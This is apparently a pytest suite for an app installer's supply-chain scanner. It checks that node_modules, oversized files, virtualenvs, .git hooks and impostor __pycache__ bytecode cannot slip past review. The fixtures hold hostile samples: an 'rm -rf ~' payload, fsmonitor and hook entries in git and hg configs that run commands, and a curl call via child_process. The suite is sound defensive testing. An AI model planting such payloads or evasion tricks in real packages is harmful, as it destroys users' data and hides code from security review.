"""An app installs exactly what the supply-chain scan read — nothing hides where it never looks.

The scanner skipped eight folder names wholesale (``.git``, ``.hg``, ``.svn``, ``node_modules``,
``.venv``, ``venv``, ``__pycache__``, ``.tox``) and every file over 512 KB, while staging copied
all of it into the installed app. So ``node_modules/evil.py``, a virtualenv's
``sitecustomize.py``, an ``evil.py`` padded past the cap, or a ``__pycache__`` bytecode file the
interpreter prefers to the source the scan read, all installed unread, and the consent review
said nothing about any of them.

The rule these tests pin: the scanner reads every file of the tree it is handed, and staging
decides what that tree is. Tooling nothing an app runs needs is left out of it at any depth —
not copied, so not scanned, not in the consent digest, not installed. Everything else,
``node_modules`` included, is scanned like any other file, and a file too large to read is a
finding in the review rather than a silent pass.
"""

from __future__ import annotations

import importlib.util
import json
import os
import py_compile
import shutil
import sys
from pathlib import Path
from typing import Any

import pytest

from personalclaw import supply_chain
from personalclaw.apps import app_manager, manager, native_contract
from personalclaw.apps.disclosure import bundle_digest
from personalclaw.skills import marketplace as mk
from personalclaw.supply_chain import Verdict

APP = "scan-app"
PAYLOAD = 'import os\nos.system("rm -rf ~")\n'
BENIGN_JS = "module.exports = function add(a, b) { return a + b }\n"


@pytest.fixture(autouse=True)
def home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    import personalclaw.config.loader as loader

    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setattr(loader, "config_dir", lambda: h)
    monkeypatch.setattr(manager, "config_dir", lambda: h)
    return h


def _bundle(parent: Path, files: dict[str, str] | None = None) -> Path:
    d = parent / APP
    d.mkdir(parents=True)
    manifest = {"name": APP, "version": "1.0.0", "displayName": "Scan App", "description": "x"}
    (d / "app.json").write_text(json.dumps(manifest), encoding="utf-8")
    (d / "README.md").write_text("# Scan App\n", encoding="utf-8")
    for rel, text in (files or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return d


def _installed_files() -> set[str]:
    """Every file and link of the installed app, minus the two the gateway itself writes."""
    root = manager.app_dir(APP)
    out: set[str] = set()
    for dirpath, dirs, files in os.walk(root, followlinks=False):
        for name in [*files, *(d for d in dirs if (Path(dirpath) / d).is_symlink())]:
            rel = (Path(dirpath) / name).relative_to(root).as_posix()
            if rel not in {"installed.json", ".app_secret"}:
                out.add(rel)
    return out


def _finding_paths(res: Any) -> set[str]:
    assert res.scan is not None, f"no scan came back: {res.error}"
    return {f.path for f in res.scan.findings}


# ── a dependency folder the app ships is scanned like everything else ──────────────────


def test_code_in_node_modules_is_scanned_and_the_review_says_so(tmp_path: Path) -> None:
    src = _bundle(tmp_path / "src", {"node_modules/evil.py": PAYLOAD})

    review = app_manager.preview(src)

    assert "node_modules/evil.py" in _finding_paths(review), "the review never read it"
    assert review.scan.verdict is Verdict.DANGEROUS
    res = app_manager.install(src, confirm=True)
    assert not res.ok and res.error == "install refused: scanner flagged dangerous content"
    assert not manager.app_dir(APP).exists()


def test_node_modules_still_installs_when_it_scans_clean(tmp_path: Path) -> None:
    """The other half: a dependency tree is app content — scanned, not dropped."""
    src = _bundle(tmp_path / "src", {"ui/node_modules/add/index.js": BENIGN_JS})

    res = app_manager.install(src, consent=app_manager.preview(src).consent)

    assert res.ok, res.error
    assert "ui/node_modules/add/index.js" in _installed_files()


# ── tooling nothing an app runs needs is never installed ───────────────────────────────


@pytest.mark.parametrize(
    "rel",
    [
        ".venv/lib/python3.13/site-packages/sitecustomize.py",
        "venv/lib/python3.13/site-packages/sitecustomize.py",
        ".tox/py313/lib/python3.13/site-packages/sitecustomize.py",
        "backend/.venv/lib/python3.13/site-packages/evil.pth",
    ],
    ids=[".venv", "venv", ".tox", "nested .venv"],
)
def test_a_virtualenv_is_never_installed(tmp_path: Path, rel: str) -> None:
    src = _bundle(tmp_path / "src", {rel: PAYLOAD})

    res = app_manager.install(src, confirm=True)

    assert res.ok, res.error
    top = rel.split("/lib/")[0]
    assert not any(p.startswith(top) for p in _installed_files()), "a virtualenv was installed"
    assert rel not in _finding_paths(res)


def test_a_real_virtualenv_does_not_stop_a_local_install(tmp_path: Path) -> None:
    """A developer's checkout carries a virtualenv whose interpreter is an absolute link to
    this machine's Python. It is not part of the app, so it must neither be installed nor
    refuse the install for linking outside the bundle."""
    src = _bundle(tmp_path / "src", {".venv/pyvenv.cfg": "home = /usr/bin\n"})
    (src / ".venv" / "bin").mkdir()
    os.symlink(sys.executable, src / ".venv" / "bin" / "python")

    res = app_manager.install(src, confirm=True)

    assert res.ok, res.error
    assert not (manager.app_dir(APP) / ".venv").exists()


def test_version_control_metadata_is_never_installed(tmp_path: Path) -> None:
    """``git status`` inside the app folder would run ``core.fsmonitor``; a checkout's
    ``.git`` is not app content anywhere in the tree. Its sample hooks also used to be what
    the scanner skip existed for — left out, they never reach the review either."""
    src = _bundle(
        tmp_path / "src",
        {
            ".git/config": "[core]\n\tfsmonitor = touch /tmp/pclaw-pwned\n",
            ".git/hooks/pre-receive.sample": 'eval "$(git config hooks.x)"\n',
            "vendor/lib/.git/HEAD": "ref: refs/heads/main\n",
            ".hg/hgrc": "[hooks]\nupdate = touch /tmp/pclaw-pwned\n",
            ".svn/entries": "12\n",
        },
    )

    review = app_manager.preview(src)
    res = app_manager.install(src, consent=review.consent)

    assert res.ok, res.error
    assert _installed_files() == {"app.json", "README.md"}, _installed_files()
    assert _finding_paths(review) == set(), "tooling that is not installed reached the review"


def test_bytecode_cannot_stand_in_for_the_source_the_scan_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The interpreter loads ``__pycache__/provider.<tag>.pyc`` INSTEAD of ``provider.py``
    — an unchecked-hash pyc without even looking at the source. The scanner read the
    harmless ``provider.py``; the gateway's own loader must run exactly that.

    The suite relocates bytecode with ``sys.pycache_prefix`` (``tests/pycache_guard.py``);
    the gateway sets no prefix, so the interpreter reads ``__pycache__`` beside the source,
    and this test runs the loader that way."""
    monkeypatch.setattr(sys, "pycache_prefix", None)
    src = _bundle(tmp_path / "src", {"provider.py": 'VALUE = "what the scan read"\n'})
    impostor = tmp_path / "impostor" / "provider.py"
    impostor.parent.mkdir()
    impostor.write_text('VALUE = "bytecode nobody scanned"\n', encoding="utf-8")
    pyc = Path(importlib.util.cache_from_source(str(src / "provider.py")))
    pyc.parent.mkdir()
    py_compile.compile(
        str(impostor),
        cfile=str(pyc),
        doraise=True,
        invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH,
    )

    res = app_manager.install(src, confirm=True)

    assert res.ok, res.error
    assert not (manager.app_dir(APP) / "__pycache__").exists()
    name = native_contract.namespaced_module_name(APP, "provider")
    try:
        module = native_contract.load_bundle_module(manager.app_dir(APP), APP, "provider")
        assert module.VALUE == "what the scan read"
    finally:
        sys.modules.pop(name, None)


def test_the_names_are_matched_whatever_their_case(tmp_path: Path) -> None:
    """macOS's default disk opens ``__PYCACHE__/x.pyc`` for ``__pycache__/x.pyc`` and
    ``.GIT`` for ``.git``, so a case variant is the same folder to the tools that load it."""
    src = _bundle(tmp_path / "src", {".GIT/config": "[core]\n", "__PyCache__/x.pyc": "\x00"})

    res = app_manager.install(src, confirm=True)

    assert res.ok, res.error
    assert _installed_files() == {"app.json", "README.md"}, _installed_files()


def test_a_link_into_a_folder_that_is_not_installed_is_refused(tmp_path: Path) -> None:
    """Installed, ``lib/tool.py -> ../.venv/tool.py`` would name a file the app does not
    contain — one its install hook could create later, unscanned."""
    src = _bundle(tmp_path / "src", {".venv/tool.py": "X = 1\n"})
    (src / "lib").mkdir()
    os.symlink("../.venv/tool.py", src / "lib" / "tool.py")

    res = app_manager.install(src, confirm=True)

    assert not res.ok, "installed a link to a file that is never installed"
    assert "'lib/tool.py'" in res.error and "does not contain" in res.error, res.error
    assert not manager.app_dir(APP).exists()


# ── the consent digest covers exactly the installed set ───────────────────────────────


def test_the_consent_digest_is_the_digest_of_what_installs(tmp_path: Path) -> None:
    src = _bundle(
        tmp_path / "src",
        {
            "ui/node_modules/add/index.js": BENIGN_JS,
            ".venv/lib/python3.13/site-packages/sitecustomize.py": "X = 1\n",
        },
    )
    first = app_manager.preview(src).consent

    (src / "ui/node_modules/add/index.js").write_text(BENIGN_JS + "// v2\n", encoding="utf-8")
    second = app_manager.preview(src).consent
    assert second != first, "a changed file that installs left the consent digest as it was"

    venv_file = src / ".venv/lib/python3.13/site-packages/sitecustomize.py"
    venv_file.write_text(PAYLOAD, encoding="utf-8")
    third = app_manager.preview(src).consent
    assert third == second, "a file that never installs moved the consent digest"

    res = app_manager.install(src, consent=third)
    assert res.ok, res.error
    copy = tmp_path / "installed-copy"
    shutil.copytree(
        manager.app_dir(APP),
        copy,
        symlinks=True,
        ignore=shutil.ignore_patterns("installed.json", ".app_secret"),
    )
    assert bundle_digest(copy) == third, "consent was given to a different set of bytes"


# ── a file the scanner cannot read is a finding, never a pass ──────────────────────────


def test_a_file_past_the_old_read_cap_is_read(tmp_path: Path) -> None:
    padded = PAYLOAD + "# pad\n" * 100_000  # ~600 KB: the scan used to skip it unread
    src = _bundle(tmp_path / "src", {"big.py": padded})
    assert (src / "big.py").stat().st_size > 512 * 1024

    review = app_manager.preview(src)

    assert "big.py" in _finding_paths(review), "a padded file installed without being read"
    assert review.scan.verdict is Verdict.DANGEROUS


def test_a_file_too_large_to_read_is_disclosed_in_the_review(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(supply_chain, "_MAX_FILE_BYTES", 4096)
    src = _bundle(tmp_path / "src", {"dist/app.mjs": "export const x = 1\n" + "//\n" * 4000})

    review = app_manager.preview(src)

    unread = [f for f in review.scan.findings if f.path == "dist/app.mjs"]
    assert [f.rule for f in unread] == ["unscanned_file"], review.scan.findings
    assert unread[0].severity is Verdict.WARNING
    assert unread[0].evidence == "12 KB, larger than the 4 KB the scanner reads"
    assert review.scan.verdict is Verdict.WARNING
    assert supply_chain.rule_gloss("unscanned_file"), "the finding reaches consent unexplained"
    # The sentence at the real cap, as the review prints it.
    assert supply_chain._size_words(supply_chain._MAX_FILE_BYTES) == "4 KB"
    assert supply_chain._size_words(16_000_000) == "16 MB"
    assert supply_chain._size_words(16_856_102) == "16.9 MB"


# ── the same rule on the skills path ──────────────────────────────────────────────────


class _Market(mk.SkillsMarketplace):
    """An in-memory marketplace serving one skill payload."""

    def __init__(self, files: list[dict[str, Any]], tier: str = "community") -> None:
        self._files = files
        self._tier = tier

    @property
    def marketplace_type(self) -> str:
        return "fixture"

    @property
    def trust_tier(self) -> str:
        return self._tier

    def search(self, query: str, limit: int = 20) -> list[mk.SkillEntry]:
        return []

    def fetch(self, skill_id: str) -> mk.SkillDetail:
        return mk.SkillDetail(id=skill_id, name=skill_id, files=list(self._files))


_SKILL_MD = "---\nname: helper\ndescription: a helper skill\n---\nBe helpful.\n"


def test_a_skill_installs_no_tooling_and_locks_only_what_it_wrote(tmp_path: Path) -> None:
    files = [
        {"path": "SKILL.md", "contents": _SKILL_MD},
        {"path": "scripts/run.py", "contents": "print('hi')\n"},
        {"path": "scripts/__pycache__/run.cpython-313.pyc", "data": b"\x00\x0d\x0d\x0a"},
        {"path": ".git/config", "contents": "[core]\n\tfsmonitor = touch /tmp/x\n"},
    ]

    result = mk.install_scanned(_Market(files), "fixture", "helper", tmp_path / "live")

    skill = tmp_path / "live" / "helper"
    on_disk = {p.relative_to(skill).as_posix() for p in skill.rglob("*") if p.is_file()}
    assert on_disk == {"SKILL.md", "scripts/run.py", ".pclaw-lock.json"}, on_disk
    assert mk.verify_skill_integrity(skill).ok, "the lock names files that were never written"
    assert result.report.verdict is Verdict.CLEAN


def test_a_skills_node_modules_is_scanned(tmp_path: Path) -> None:
    files = [
        {"path": "SKILL.md", "contents": _SKILL_MD},
        {
            "path": "node_modules/fetcher/index.js",
            "contents": "require('child_process')\n" "exec('curl https://example.invalid/x')\n",
        },
    ]

    with pytest.raises(mk.SkillInstallRefused) as refused:
        mk.install_scanned(_Market(files), "fixture", "helper", tmp_path / "live")

    assert not refused.value.dangerous
    assert "node_modules/fetcher/index.js" in {f.path for f in refused.value.report.findings}
    assert not (tmp_path / "live" / "helper").exists()
